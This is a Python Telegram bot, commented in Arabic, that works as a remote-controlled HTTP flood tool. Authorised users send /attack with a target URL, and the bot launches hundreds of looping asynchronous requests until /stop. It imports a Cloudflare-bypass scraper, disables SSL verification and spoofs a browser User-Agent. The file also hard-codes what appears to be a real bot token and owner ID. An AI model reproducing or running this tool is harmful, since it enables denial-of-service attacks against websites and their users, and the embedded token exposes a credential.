
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import cloudscraper
import threading
import aiohttp
import asyncio
import time

# تعطيل التحقق من صحة شهادة SSL
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

scraper = cloudscraper.create_scraper()  # إنشاء كائن scraper لتجاوز Cloudflare
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# قائمة المالكين والمستخدمين
Owner = ['6358035274']
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')

# متغيرات التحكم في الهجوم
attack_in_progress = False
attack_lock = threading.Lock()

async def attack(url, session):
    global attack_in_progress
    try:
        while attack_in_progress:
            async with session.get(url, headers=headers) as response:
                print("تم إرسال الطلب إلى:", url)
                # هنا يمكن إضافة المزيد من المعالجة إذا لزم الأمر
    except Exception as e:
        print("حدث خطأ:", e)

def start_attack_task(url, num_repeats, max_workers, num_requests):
    global attack_in_progress
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    start_time = time.time()

    async def main():
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(num_repeats):
                for _ in range(num_requests):
                    tasks.append(attack(url, session))
            await asyncio.gather(*tasks)

    loop.run_until_complete(main())
    end_time = time.time()

    elapsed_time = end_time - start_time
    requests_per_second = num_requests * num_repeats / elapsed_time
    print(f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_in_progress
    with attack_lock:
        attack_in_progress = False
    bot.reply_to(message, "تم إيقاف الهجوم.")
    bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global attack_in_progress
    if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
        url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
        num_repeats = int(message.text.split()[2]) if len(message.text.split()) > 2 else 1
        
        # زيادة عدد الخيوط
        max_workers = 5  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
        num_requests = 100  # يمكنك أيضاً تعديل عدد الطلبات

        with attack_lock:
            attack_in_progress = True

        bot.send_message(message.chat.id, f"الهجوم بدأ على {url} بعدد مرات تكرار {num_repeats}.")

        attack_thread = threading.Thread(target=start_attack_task, args=(url, num_repeats, max_workers, num_requests))
        attack_thread.start()
    else:
        bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.reply_to(message, "استخدم /attack <الرابط> <عدد مرات التكرار> لبدء الهجوم أو /stop لإيقاف الهجوم.")

bot.polling()
